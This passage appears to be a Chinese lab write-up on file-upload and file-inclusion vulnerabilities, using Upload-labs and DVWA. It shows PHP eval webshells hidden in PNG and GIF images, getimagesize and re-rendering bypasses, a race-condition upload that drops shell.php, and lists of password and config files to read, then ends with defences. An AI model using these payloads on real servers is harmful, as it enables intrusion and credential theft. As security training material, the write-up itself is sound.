<h5 id="h:46bbb15a-e84a-41c3-aa82-4d630b9aa97a">制作图片马</h5>
<div class="outline-text-5" id="text-h:46bbb15a-e84a-41c3-aa82-4d630b9aa97a">
<p>
下面介绍几种制作图片马的方法：
</p>

<ul class="org-ul">
<li>windows 系统文件拼接：cmd 使用命令 <code>copy /b a.png + a.php hecheng.png</code></li>
<li>使用 010 editor
<ul class="org-ul">
<li>直接在图片的尾部写一句话木马</li>
<li>取一个真实的脚本文件，在文件头部添加图片的文件头，如 png 89 50 4E 47（严格意义上说，不算图片马）</li>
</ul></li>
<li>使用 burp suite 抓包，在尾部添加一句话木马</li>
</ul>
</div>
</div>
<div id="outline-container-h:633581a8-3855-410b-a3e1-70a5ae87dfc2" class="outline-5">
<h5 id="h:633581a8-3855-410b-a3e1-70a5ae87dfc2">文件内容绕过</h5>
<div class="outline-text-5" id="text-h:633581a8-3855-410b-a3e1-70a5ae87dfc2">
<p>
新建一个png图片用 Hex Fiend 打开，在最后加上一句话木马
</p>

<p>
或在php木马之前添加 89504E47 ，无需修改php文件后缀名直接上传试试：
</p>


<p>
这里我们在文件后加入一句话木马
</p>
<div class="org-src-container">
<pre class="src src-sh">&lt;?php eval(@$<span style="color: #a0522d;">_POST</span>[<span style="color: #8b2252;">'a'</span>]);?&gt;
</pre>
</div>

<p>
上传成功，可获取图片连接
</p>
<div class="org-src-container">
<pre class="src src-sh">http://127.0.0.1:8081/upload/8820230711210638.png
</pre>
</div>


<p>
访问 <a href="http://127.0.0.1:8081/include.php?file">http://127.0.0.1:8081/include.php?file</a>=
</p>

<p>
配合 <code>本地文件包含漏洞</code>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">127.0.0.1:8081/include.php?</span>
 &lt;?php
/*
&#26412;&#39029;&#38754;&#23384;&#22312;&#25991;&#20214;&#21253;&#21547;&#28431;&#27934;&#65292;&#29992;&#20110;&#27979;&#35797;&#22270;&#29255;&#39532;&#26159;&#21542;&#33021;&#27491;&#24120;&#36816;&#34892;&#65281;
*/
<span style="color: #0000ff;">header</span>(<span style="color: #8b2252;">"Content-Type:text/html;charset=utf-8"</span>);
$<span style="color: #a0522d;">file</span> = $<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'file'</span>];
<span style="color: #a020f0;">if</span>(isset($<span style="color: #a0522d;">file</span>)){
    include $<span style="color: #a0522d;">file</span>;
}<span style="color: #a020f0;">else</span>{
    show_source(__file__);
}
?&gt; 
</pre>
</div>

<p>
接着用file包含图片马
</p>
<div class="org-src-container">
<pre class="src src-sh">http://127.0.0.1:8081/include.php?<span style="color: #a0522d;">file</span>=upload/8820230711210638.png
</pre>
</div>


<p>
也可以直接执行代码
</p>

<figure id="org4afcc52">
<img src="./images/img_20230712_052046.png" alt="img_20230712_052046.png" width="50%">

</figure>


<p>
蚁剑链接，完成webshell
</p>
</div>
</div>
</div>
<div id="outline-container-h:8b86afca-1e8d-4a47-ac5b-82089eb562bb" class="outline-4">
<h4 id="h:8b86afca-1e8d-4a47-ac5b-82089eb562bb">突破getimagesize及exif_imagetype（√）</h4>
<div class="outline-text-4" id="text-h:8b86afca-1e8d-4a47-ac5b-82089eb562bb">
<p>
Upload-labs（Pass-15）代码是用 <code>getimagesize</code> 获取文件类型，进行文件判断。此函数是获取文件类型是不是图片格式的，比如图片的长度和高度等。这个时候就不能再上传假图片了，需要上传一张真图然后抓包，在最后添加一句话木马。
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #a020f0;">function</span> <span style="color: #0000ff;">isImage</span>($<span style="color: #a0522d;">filename</span>){
    $<span style="color: #a0522d;">types</span> = <span style="color: #8b2252;">'.jpeg|.png|.gif'</span>;
    <span style="color: #a020f0;">if</span>(file_exists($<span style="color: #a0522d;">filename</span>)){
        $<span style="color: #a0522d;">info</span> = getimagesize($<span style="color: #a0522d;">filename</span>);
        $<span style="color: #a0522d;">ext</span> = image_type_to_extension($<span style="color: #a0522d;">info</span>[2]);
        <span style="color: #a020f0;">if</span>(stripos($<span style="color: #a0522d;">types</span>,$<span style="color: #a0522d;">ext</span>)&gt;=0){
            <span style="color: #a020f0;">return</span> $<span style="color: #a0522d;">ext</span>;
        }<span style="color: #a020f0;">else</span>{
            <span style="color: #a020f0;">return</span> false;
        }
    }<span style="color: #a020f0;">else</span>{
        <span style="color: #a020f0;">return</span> false;
    }
}

$<span style="color: #a0522d;">is_upload</span> = false;
$<span style="color: #a0522d;">msg</span> = null;
<span style="color: #a020f0;">if</span>(isset($<span style="color: #a0522d;">_POST</span>[<span style="color: #8b2252;">'submit'</span>])){
    $<span style="color: #a0522d;">temp_file</span> = $<span style="color: #a0522d;">_FILES</span>[<span style="color: #8b2252;">'upload_file'</span>][<span style="color: #8b2252;">'tmp_name'</span>];
    $<span style="color: #a0522d;">res</span> = isImage($<span style="color: #a0522d;">temp_file</span>);
    <span style="color: #a020f0;">if</span>(!$<span style="color: #a0522d;">res</span>){
        $<span style="color: #a0522d;">msg</span> = <span style="color: #8b2252;">"&#25991;&#20214;&#26410;&#30693;&#65292;&#19978;&#20256;&#22833;&#36133;&#65281;"</span>;
    }<span style="color: #a020f0;">else</span>{
        $<span style="color: #a0522d;">img_path</span> = UPLOAD_PATH.<span style="color: #8b2252;">"/"</span>.rand(10, 99).date(<span style="color: #8b2252;">"YmdHis"</span>)<span style="color: #483d8b;">.</span>$<span style="color: #a0522d;">res</span>;
        <span style="color: #a020f0;">if</span>(move_uploaded_file($<span style="color: #a0522d;">temp_file</span>,$<span style="color: #a0522d;">img_path</span>)){
            $<span style="color: #a0522d;">is_upload</span> = true;
        } <span style="color: #a020f0;">else</span> {
            $<span style="color: #a0522d;">msg</span> = <span style="color: #8b2252;">"&#19978;&#20256;&#20986;&#38169;&#65281;"</span>;
        }
    }
}

</pre>
</div>

<p>
Upload-labs（Pass-16） <code>exif_imagetype</code>  读取一个图像的第一个字节并检查其签名（文件签名即文件属性信息: 高等），所以也是可以通过在图片末尾添加一句话木马来进行绕过的，与（Pass-15）解法相同。
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #a020f0;">function</span> <span style="color: #0000ff;">isImage</span>($<span style="color: #a0522d;">filename</span>){
    //&#38656;&#35201;&#24320;&#21551;php_exif&#27169;&#22359;
    $<span style="color: #a0522d;">image_type</span> = exif_imagetype($<span style="color: #a0522d;">filename</span>);
    switch ($<span style="color: #a0522d;">image_type</span>) {
        <span style="color: #a020f0;">case</span> IMAGETYPE_GIF:
            <span style="color: #a020f0;">return</span> <span style="color: #8b2252;">"gif"</span>;
            <span style="color: #a020f0;">break</span>;
        <span style="color: #a020f0;">case</span> IMAGETYPE_JPEG:
            <span style="color: #a020f0;">return</span> <span style="color: #8b2252;">"jpg"</span>;
            <span style="color: #a020f0;">break</span>;
        <span style="color: #a020f0;">case</span> IMAGETYPE_PNG:
            <span style="color: #a020f0;">return</span> <span style="color: #8b2252;">"png"</span>;
            <span style="color: #a020f0;">break</span>;    
        default:
            <span style="color: #a020f0;">return</span> false;
            <span style="color: #a020f0;">break</span>;
    }
}

$<span style="color: #a0522d;">is_upload</span> = false;
$<span style="color: #a0522d;">msg</span> = null;
<span style="color: #a020f0;">if</span>(isset($<span style="color: #a0522d;">_POST</span>[<span style="color: #8b2252;">'submit'</span>])){
    $<span style="color: #a0522d;">temp_file</span> = $<span style="color: #a0522d;">_FILES</span>[<span style="color: #8b2252;">'upload_file'</span>][<span style="color: #8b2252;">'tmp_name'</span>];
    $<span style="color: #a0522d;">res</span> = isImage($<span style="color: #a0522d;">temp_file</span>);
    <span style="color: #a020f0;">if</span>(!$<span style="color: #a0522d;">res</span>){
        $<span style="color: #a0522d;">msg</span> = <span style="color: #8b2252;">"&#25991;&#20214;&#26410;&#30693;&#65292;&#19978;&#20256;&#22833;&#36133;&#65281;"</span>;
    }<span style="color: #a020f0;">else</span>{
        $<span style="color: #a0522d;">img_path</span> = UPLOAD_PATH.<span style="color: #8b2252;">"/"</span>.rand(10, 99).date(<span style="color: #8b2252;">"YmdHis"</span>)<span style="color: #483d8b;">.</span><span style="color: #8b2252;">"."</span>.$<span style="color: #a0522d;">res</span>;
        <span style="color: #a020f0;">if</span>(move_uploaded_file($<span style="color: #a0522d;">temp_file</span>,$<span style="color: #a0522d;">img_path</span>)){
            $<span style="color: #a0522d;">is_upload</span> = true;
        } <span style="color: #a020f0;">else</span> {
            $<span style="color: #a0522d;">msg</span> = <span style="color: #8b2252;">"&#19978;&#20256;&#20986;&#38169;&#65281;"</span>;
        }
    }
}
</pre>
</div>
</div>
</div>
<div id="outline-container-h:5fd85b1a-8001-490f-a033-a4b5e614be50" class="outline-4">
<h4 id="h:5fd85b1a-8001-490f-a033-a4b5e614be50">二次渲染绕过（√）</h4>
<div class="outline-text-4" id="text-h:5fd85b1a-8001-490f-a033-a4b5e614be50">
<p>
<b>二次渲染</b> ：就是根据用户上传的图片，新生成一个图片，将原始图片删除，将新图片添加到数据库中。比如一些网站根据用户上传的头像生成大中小不同尺寸的图像。
</p>

<p>
Upload-labs（Pass-17）这一关比较综合，判断了后缀名、content-type，以及利用imagecreatefromXXX判断是否为真实图片，最后再做了一次二次渲染。可以看到，这里先是判断Content-Type，然后再用 <code>imagecreatefrom[gif|png|jpg]</code> 函数判断是否是图片格式，如果是图片的话再用 <code>image[gif|png|jpg]</code> 函数对其进行二次渲染。我们可以上传一个正常的图片文件，观察其上传前和上传后图片的二进制流是否发生变化。
</p>



<figure id="org4e8a138">
<img src="./images/img_20230712_062651.png" alt="img_20230712_062651.png" width="50%">

</figure>


<ul class="org-ul">
<li>GIF：渲染前后的两张 GIF，没有发生变化的数据块部分直接插入 Webshell 即可</li>

<li>PNG：没有 GIF 那么简单，需要将数据写入到 PLTE 数据块 或者 IDAT 数据块</li>

<li>JPG：需要使用脚本将数据插入到特定的数据块，而且可能会不成功，所以需要多次尝试</li>
</ul>

<p>
这里我们使用gif图片。
</p>


<figure id="org49fa89d">
<img src="./images/happy.gif" alt="happy.gif" width="50%">

</figure>


<p>
将源文件和二次渲染过的文件进行比较，找出源文件中没有被修改的那段区域，在那段区域写入php代码即可。
</p>

<p>
先将一句话添加到 happy.gif 的尾部，然后上传
</p>



<figure id="org5004c68">
<img src="./images/img_20230712_072526.png" alt="img_20230712_072526.png" width="50%">

</figure>


<p>
上传成功
</p>

<p>
然后将图片下载下来，可以看到下载下来的文件名已经变化，所以这是经过二次渲染的图片。用 hexfiend 打开，发现刚才写入的一句话木马已经被去除
</p>

<p>
用 hex fiend 打开 上传前 和 上传后 的图片，选择compare 进行对比：
</p>

<p>
经过对比可以发现，蓝色的区域都是没有改变的
</p>

<p>
我们将一句话木马写到该位置，只要写完 gif 格式没被破坏就行。
</p>

<p>
这里我们在文件中加入一句话木马
</p>
<div class="org-src-container">
<pre class="src src-sh">&lt;?php eval(@$<span style="color: #a0522d;">_POST</span>[<span style="color: #8b2252;">'a'</span>]);?&gt;
</pre>
</div>

<p>
为了防止被覆盖，先将插入木马位置后的所有内容剪贴出去，插入木马后再粘贴回来
</p>

<figure id="org5a96189">
<img src="./images/img_20230713_005824.png" alt="img_20230713_005824.png" width="50%">

</figure>



<figure id="org2882abd">
<img src="./images/img_20230713_010344.png" alt="img_20230713_010344.png" width="50%">

</figure>



<p>
重新上传后再下载到本地使用16进制编辑器打开，可以看到php代码没有被去除，成功上传图片马
</p>



<figure id="orgfcf7592">
<img src="./images/img_20230713_010534.png" alt="img_20230713_010534.png" width="50%">

</figure>



<figure id="orgbe0a2e4">
<img src="./images/img_20230713_010701.png" alt="img_20230713_010701.png" width="50%">

</figure>

<p>
二次渲染后，包含一句话木马的图片
</p>

<figure id="orgb413e79">
<img src="./images/1209577858.gif" alt="1209577858.gif" width="50%">

</figure>

<p>
使用文件包含成功
</p>

<div class="org-src-container">
<pre class="src src-sh">http://124.222.171.19:8084/include.php?<span style="color: #a0522d;">file</span>=upload/1209577858.gif
</pre>
</div>


<figure id="orgf56636f">
<img src="./images/img_20230713_011058.png" alt="img_20230713_011058.png" width="50%">

</figure>



<p>
蚁剑链接，成功getshell
</p>


<figure id="org9047e16">
<img src="./images/img_20230713_011229.png" alt="img_20230713_011229.png" width="50%">

</figure>



<figure id="org0b9e33d">
<img src="./images/img_20230713_011354.png" alt="img_20230713_011354.png" width="50%">

</figure>
</div>
</div>
<div id="outline-container-h:16169970-6ce2-4234-bb77-cf2b037d0d89" class="outline-4">
<h4 id="h:16169970-6ce2-4234-bb77-cf2b037d0d89">文件包含绕过</h4>
<div class="outline-text-4" id="text-h:16169970-6ce2-4234-bb77-cf2b037d0d89">
<p>
前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。
</p>

<p>
绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）
（1）先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；
（2）然后再上传一个.php的文件，内容为
</p>

<div class="org-src-container">
<pre class="src src-php">&lt;?php Include(“上传的txt文件路径”);?&gt;1
</pre>
</div>

<p>
此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：
</p>
<div class="org-src-container">
<pre class="src src-php">#PHP
&lt;?php Include("上传的txt文件路径");?&gt;
#ASP
&lt;!--#include file="上传的txt文件路径" --&gt;
#JSP
&lt;jsp:inclde page="上传的txt文件路径"/&gt;
or
&lt;%@include file="上传的txt文件路径"%&gt;
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-h:62ed4c39-2129-4e18-8924-233f81ad1b43" class="outline-3">
<h3 id="h:62ed4c39-2129-4e18-8924-233f81ad1b43">代码逻辑（条件竞争）</h3>
<div class="outline-text-3" id="text-h:62ed4c39-2129-4e18-8924-233f81ad1b43">
<div class="org-src-container">
<pre class="src src-text">&#26465;&#20214;&#31454;&#20105;&#19978;&#20256;&#26159;&#19968;&#31181;&#26381;&#21153;&#22120;&#31471;&#30340;&#28431;&#27934;&#65292;&#30001;&#20110;&#21518;&#31471;&#31243;&#24207;&#25805;&#20316;&#36923;&#36753;&#19981;&#21512;&#29702;&#23548;&#33268;&#12290;

&#30001;&#20110;&#26381;&#21153;&#22120;&#31471;&#22312;&#22788;&#29702;&#19981;&#21516;&#29992;&#25143;&#30340;&#35831;&#27714;&#26102;&#26159;&#24182;&#21457;&#36827;&#34892;&#30340;&#65292;&#22240;&#27492;&#65292;&#22914;&#26524;&#24182;&#21457;&#22788;&#29702;&#19981;&#24403;&#25110;&#30456;&#20851;&#25805;&#20316;&#36923;&#36753;&#39034;&#24207;&#35774;&#35745;&#30340;&#19981;&#21512;&#29702;&#26102;&#65292;&#23558;&#20250;&#23548;&#33268;&#27492;&#31867;&#38382;&#39064;&#30340;&#21457;&#29983;&#65292;&#27492;&#28431;&#27934;&#19968;&#33324;&#21457;&#29983;&#22312;&#22810;&#20010;&#32447;&#31243;&#21516;&#26102;&#35775;&#38382;&#21516;&#19968;&#20010;&#20849;&#20139;&#20195;&#30721;&#12289;&#21464;&#37327;&#12289;&#25991;&#20214;&#31561;&#27809;&#26377;&#36827;&#34892;&#38145;&#25805;&#20316;&#25110;&#32773;&#21516;&#27493;&#25805;&#20316;&#30340;&#22330;&#26223;&#20013;&#12290;
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh">$<span style="color: #a0522d;">is_upload</span> = false;
$<span style="color: #a0522d;">msg</span> = null;

<span style="color: #a020f0;">if</span>(isset($<span style="color: #a0522d;">_POST</span>[<span style="color: #8b2252;">'submit'</span>])){
    $<span style="color: #a0522d;">ext_arr</span> = array(<span style="color: #8b2252;">'jpg'</span>,<span style="color: #8b2252;">'png'</span>,<span style="color: #8b2252;">'gif'</span>);
    $<span style="color: #a0522d;">file_name</span> = $<span style="color: #a0522d;">_FILES</span>[<span style="color: #8b2252;">'upload_file'</span>][<span style="color: #8b2252;">'name'</span>];
    $<span style="color: #a0522d;">temp_file</span> = $<span style="color: #a0522d;">_FILES</span>[<span style="color: #8b2252;">'upload_file'</span>][<span style="color: #8b2252;">'tmp_name'</span>];
    $<span style="color: #a0522d;">file_ext</span> = substr($<span style="color: #a0522d;">file_name</span>,strrpos($<span style="color: #a0522d;">file_name</span>,<span style="color: #8b2252;">"."</span>)+1);
    $<span style="color: #a0522d;">upload_file</span> = UPLOAD_PATH . <span style="color: #8b2252;">'/'</span> . $<span style="color: #a0522d;">file_name</span>;

    <span style="color: #a020f0;">if</span>(move_uploaded_file($<span style="color: #a0522d;">temp_file</span>, $<span style="color: #a0522d;">upload_file</span>)){
        <span style="color: #a020f0;">if</span>(in_array($<span style="color: #a0522d;">file_ext</span>,$<span style="color: #a0522d;">ext_arr</span>)){
             $<span style="color: #a0522d;">img_path</span> = UPLOAD_PATH . <span style="color: #8b2252;">'/'</span>. rand(10, 99).date(<span style="color: #8b2252;">"YmdHis"</span>)<span style="color: #483d8b;">.</span><span style="color: #8b2252;">"."</span>.$<span style="color: #a0522d;">file_ext</span>;
             rename($<span style="color: #a0522d;">upload_file</span>, $<span style="color: #a0522d;">img_path</span>);
             $<span style="color: #a0522d;">is_upload</span> = true;
        }<span style="color: #a020f0;">else</span>{
            $<span style="color: #a0522d;">msg</span> = <span style="color: #8b2252;">"&#21482;&#20801;&#35768;&#19978;&#20256;.jpg|.png|.gif&#31867;&#22411;&#25991;&#20214;&#65281;"</span>;
            unlink($<span style="color: #a0522d;">upload_file</span>);
        }
    }<span style="color: #a020f0;">else</span>{
        $<span style="color: #a0522d;">msg</span> = <span style="color: #8b2252;">'&#19978;&#20256;&#20986;&#38169;&#65281;'</span>;
    }
}
</pre>
</div>

<p>
Upload-labs（Pass-18），从源码来看，服务器先是将上传的文件保存下来，然后将文件的后缀名同白名单对比，如果是jpg、png、gif中的一种，就将文件进行重命名。如果不符合的话，unlink()函数就会删除该文件。
</p>

<p>
这么看来如果我们上传一个图片马的话，网站依旧存在文件包含漏洞我们还是可以进行利用。但是如果没有文件包含漏洞的话，我们就只能上传一个php木马来解析运行了。
</p>

<p>
上传上去就被删除了，我还怎么去访问呢？
</p>

<p>
要知道代码执行的过程是需要耗费时间的，如果我们能在上传的一句话被删除之前访问就能成功执行，这个也叫做条件竞争上传绕过。
</p>

<p>
我们可以利用 <code>burp</code> 多线程发包，然后不断在浏览器访问我们的Webshell，会有一瞬间的访问成功。
</p>

<p>
为了更好的演示效果，把一句话木马换一下改为：
</p>
<div class="org-src-container">
<pre class="src src-sh">&lt;?php fputs(fopen(<span style="color: #8b2252;">'shell.php'</span>,<span style="color: #8b2252;">'w'</span>),<span style="color: #8b2252;">'&lt;?php @eval($_POST["xxx"])?&gt;'</span>);?&gt;
</pre>
</div>

<p>
把这个php文件通过burp一直不停的重放，然后再写python脚本去不停的访问我们上传的这个文件，总会有那么一瞬间是还没来得及删除就可以被访问到的，一旦访问到该文件就会在当前目录下生成一个shell.php的一句话木马。在正常的渗透测试中这也是个好办法，因为单纯的去访问带有phpinfo()的文件并没有什么卵用。
</p>

<p>
上传的文件一旦删除了还是无法利用，但是这个办法生成的shell.php服务器是不会删除的，我们就可以通过蚁剑去链接了。
</p>

<p>
第一步：上传cs.php，并用burp抓包，发送到Intruder模块
</p>



<figure id="org880b335">
<img src="./images/img_20230713_014435.png" alt="img_20230713_014435.png" width="50%">

</figure>


<p>
不需要暴力破解，只是想用来发包，所以clear所有变量。然后再加入一个空格变量，让这个数据包能正常进行爆破，其实是空。
</p>



<figure id="orgb821623">
<img src="./images/img_20230713_014500.png" alt="img_20230713_014500.png" width="50%">

</figure>


<p>
第二步：设置无限重放，一直上传该文件
</p>

<p>
可以看到这里的配置Payload type是Null payloads。也就是不设置payload。
</p>

<p>
下方的Continue indefinitely也就是无限重放的意思。
</p>

<p>
可以看到上传该文件的数据包不停地在进行重放。
</p>

<p>
第三步：运行python脚本不停地访问cs.php直到成功访问到为止。
代码如下：
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> requests

<span style="color: #a0522d;">url</span> = <span style="color: #8b2252;">"http://127.0.0.1:8036/upload/cs.php"</span>

<span style="color: #a020f0;">while</span> <span style="color: #008b8b;">True</span>:
    <span style="color: #a0522d;">html</span> = requests.get(url)
    <span style="color: #a020f0;">if</span> html.status_code == 200:
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">"OK"</span>)
        <span style="color: #a020f0;">break</span>
</pre>
</div>


<p>
当出现OK说明访问到了该文件，那么shell.php应该也创建成功了
查看目录下已经有shell.php，直接用蚁剑连接
访问 post_shell.php.xxx.edu 可以执行PHP代码
</p>
</div>
</div>
<div id="outline-container-h:3977c995-892b-43f1-8b7c-e278619cef27" class="outline-3">
<h3 id="h:3977c995-892b-43f1-8b7c-e278619cef27">总结</h3>
<div class="outline-text-3" id="text-h:3977c995-892b-43f1-8b7c-e278619cef27">
</div>
<div id="outline-container-h:522650b5-061d-48c9-87d8-f10b335cc924" class="outline-4">
<h4 id="h:522650b5-061d-48c9-87d8-f10b335cc924">文件上传漏洞安全防御</h4>
<div class="outline-text-4" id="text-h:522650b5-061d-48c9-87d8-f10b335cc924">
<p>
1、文件上传的目录设置为不可执行
只要Web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响。
</p>

<p>
比如 Nginx可 按如下方式配置
</p>

<pre class="example" id="org7fde327">
location ~* ^/uploads/.*\.(php|php5)$ 
{
  deny all;
}
</pre>

<p>
2、判断文件类型
在判断文件类型时，可以结合使用MIME Type、后缀检查等方式。在文件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的。此外，对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码。
</p>

<p>
3、使用随机数改写文件名和文件路径
文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像shell.php.rar.rar和crossdomain.xml这种文件，都将因为重命名而无法攻击。
</p>

<p>
4、使用安全设备防御
文件上传攻击的本质就是将恶意文件或者脚本上传到服务器，专业的安全设备防御此类漏洞主要是通过对漏洞的上传利用行为和恶意文件的上传过程进行检测。恶意文件千变万化，隐藏手法也不断推陈出新，对普通的系统管理员来说可以通过部署安全设备来帮助防御。
</p>
</div>
</div>
</div>
</section>
<section id="outline-container-h:fc270d37-e9fd-403b-9b5e-97ef965d1b30" class="outline-2">
<h2 id="h:fc270d37-e9fd-403b-9b5e-97ef965d1b30">文件包含漏洞</h2>
<div class="outline-text-2" id="text-h:fc270d37-e9fd-403b-9b5e-97ef965d1b30">
<p>
主要内容：
</p>
<ul class="org-ul">
<li>文件包含漏洞概述</li>
<li>中间件日志包含绕过</li>
<li>PHP 包含读写文件</li>
<li>str._replace 函数绕过</li>
<li>包含截断绕过、fnmatch 函数绕过</li>
<li>文件包含漏洞防范措施</li>
</ul>
</div>
<div id="outline-container-h:4ca12ff1-0fc1-4ed5-80a5-9f9c75d50384" class="outline-3">
<h3 id="h:4ca12ff1-0fc1-4ed5-80a5-9f9c75d50384">概述</h3>
<div class="outline-text-3" id="text-h:4ca12ff1-0fc1-4ed5-80a5-9f9c75d50384">
<p>
程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这种文件调用的过程一般被称为文件包含。程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。
</p>

<p>
在通过PHP函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，导致意外的文件泄露甚至恶意的代码注入。
</p>
</div>
</div>
<div id="outline-container-h:c2eae595-8499-45ba-9356-6a0d56292d6a" class="outline-3">
<h3 id="h:c2eae595-8499-45ba-9356-6a0d56292d6a">分类</h3>
<div class="outline-text-3" id="text-h:c2eae595-8499-45ba-9356-6a0d56292d6a">
</div>
<div id="outline-container-h:295b4323-4294-43c4-8153-2b63d9c91def" class="outline-4">
<h4 id="h:295b4323-4294-43c4-8153-2b63d9c91def">本地文件包含</h4>
<div class="outline-text-4" id="text-h:295b4323-4294-43c4-8153-2b63d9c91def">
<p>
只能包含本地服务器上存在的文件。
</p>
<ul class="org-ul">
<li>用户对输入可控且无过滤</li>
<li>可以利用相对路径或绝对路径读取系统敏感文件</li>
</ul>
</div>
</div>
<div id="outline-container-h:a448451a-df42-49d8-9f49-81f1d9f4f0d6" class="outline-4">
<h4 id="h:a448451a-df42-49d8-9f49-81f1d9f4f0d6">远程文件包含</h4>
<div class="outline-text-4" id="text-h:a448451a-df42-49d8-9f49-81f1d9f4f0d6">
<p>
包含远程服务器上的文件。
需要php.ini开启了allow_url_fopen和allow_url_include的配置。包含的文件是第三方服务器（比如：攻击者搭建的一台Web服务器）的文件。
</p>
<ul class="org-ul">
<li>allow_url_fopen=On (默认为On) 规定是否允许从远程服务器或者网站检索数据</li>
<li>allow_url_include=On (php5.2之后默认为Off) 规定是否允许include/require远程文件</li>
</ul>
</div>
</div>
<div id="outline-container-h:d761c0f9-9961-49cd-bfe0-f33f39bb50fd" class="outline-4">
<h4 id="h:d761c0f9-9961-49cd-bfe0-f33f39bb50fd">远程与本地包含的区别</h4>
<div class="outline-text-4" id="text-h:d761c0f9-9961-49cd-bfe0-f33f39bb50fd">
<p>
参照对象是本地服务器。
</p>

<p>
本地文件包含就是通过浏览器包含web服务器上的文件，这种漏洞是因为浏览器包含文件时没有进行严格的过滤，允许遍历目录的字符注入浏览器并执行。
</p>

<p>
远程文件包含就是允许攻击者包含一个远程的文件，一般是在远程服务器上预先设置好的脚本并对外开放一个web服务，以确保该脚本能被访问到。此漏洞是因为浏览器对用户的输入没有进行检查，导致不同程度的信息泄露、拒绝服务攻击，甚至在目标服务器上执行代码。
</p>

<p>
本地文件包含与远程文件包含有着相同的原理，但前者只能包含本地服务器上存在的文件，而后者可以包含远程服务器上的文件。
</p>
</div>
</div>
</div>
<div id="outline-container-h:a48f4f73-2a19-45a0-975d-4f1c7c6c7319" class="outline-3">
<h3 id="h:a48f4f73-2a19-45a0-975d-4f1c7c6c7319">PHP中文件包含函数有以下四种</h3>
<div class="outline-text-3" id="text-h:a48f4f73-2a19-45a0-975d-4f1c7c6c7319">
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #0000ff;">require</span>()
<span style="color: #0000ff;">include</span>()

<span style="color: #0000ff;">require_once</span>()
<span style="color: #0000ff;">include_once</span>()
</pre>
</div>

<p>
include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。
</p>

<p>
而include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数 <b>只包含一次</b> 。适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，想确保它只被包括一次以避免函数重定
义，变量重新赋值等问题。
</p>
</div>
</div>
<div id="outline-container-h:6840676c-9532-42c3-9787-a08c4ebd5d84" class="outline-3">
<h3 id="h:6840676c-9532-42c3-9787-a08c4ebd5d84">URL中如果出现了如下内容就可能存在文件包含漏洞</h3>
<div class="outline-text-3" id="text-h:6840676c-9532-42c3-9787-a08c4ebd5d84">
<div class="org-src-container">
<pre class="src src-sh">?<span style="color: #a0522d;">page</span>=
?<span style="color: #a0522d;">file</span>=
?<span style="color: #a0522d;">home</span>=
</pre>
</div>

<p>
如：
dvwa File Inclusion 页面
</p>
<div class="org-src-container">
<pre class="src src-sh">http://124.222.171.19:8080/vulnerabilities/fi/?<span style="color: #a0522d;">page</span>=include.php

http://124.222.171.19:8080/vulnerabilities/fi/?<span style="color: #a0522d;">page</span>=/etc/passwd
</pre>
</div>
</div>
</div>
<div id="outline-container-h:31206df2-dd29-4cba-8f42-d2f2de0ffd82" class="outline-3">
<h3 id="h:31206df2-dd29-4cba-8f42-d2f2de0ffd82">常见的敏感信息路径</h3>
<div class="outline-text-3" id="text-h:31206df2-dd29-4cba-8f42-d2f2de0ffd82">
</div>
<div id="outline-container-h:1c5b03a0-34d2-406c-a54e-6247ebfab953" class="outline-4">
<h4 id="h:1c5b03a0-34d2-406c-a54e-6247ebfab953">Windows系统</h4>
<div class="outline-text-4" id="text-h:1c5b03a0-34d2-406c-a54e-6247ebfab953">
<div class="org-src-container">
<pre class="src src-sh">c:\boot.ini // &#26597;&#30475;&#31995;&#32479;&#29256;&#26412;
c:\windows\system32\inetsrc\MetaBase.xml //IIS&#37197;&#32622;&#25991;&#20214;
c:\windows\repair\sam //&#23384;&#20648;windows&#31995;&#32479;&#21021;&#27425;&#23433;&#35013;&#30340;&#23494;&#30721;
c:\programFiles\mysql\my.ini //MYSQL root&#23494;&#30721;
c:\windows\php.ini // php &#37197;&#32622;&#20449;&#24687;
</pre>
</div>
</div>
</div>
<div id="outline-container-h:9f63408f-9257-496a-b9f7-be12e13a4c74" class="outline-4">
<h4 id="h:9f63408f-9257-496a-b9f7-be12e13a4c74">Linux/Unix系统</h4>
<div class="outline-text-4" id="text-h:9f63408f-9257-496a-b9f7-be12e13a4c74">
<div class="org-src-container">
<pre class="src src-sh">/etc/passwd // &#36134;&#25143;&#20449;&#24687;
/etc/shadow // &#36134;&#25143;&#23494;&#30721;&#25991;&#20214;
/usr/local/app/apache2/conf/httpd.conf // Apache2&#40664;&#35748;&#37197;&#32622;&#25991;&#20214;
/usr/local/app/apache2/conf/extra/httpd-vhost.conf // &#34394;&#25311;&#32593;&#31449;&#37197;&#32622;
/usr/local/app/php5/lib/php.ini // PHP&#30456;&#20851;&#37197;&#32622;
/etc/httpd/conf/httpd.conf // Apache&#37197;&#32622;&#25991;&#20214;
/etc/my.conf // mysql &#37197;&#32622;&#25991;&#20214;
</pre>
</div>
</div>
</div>
</div>
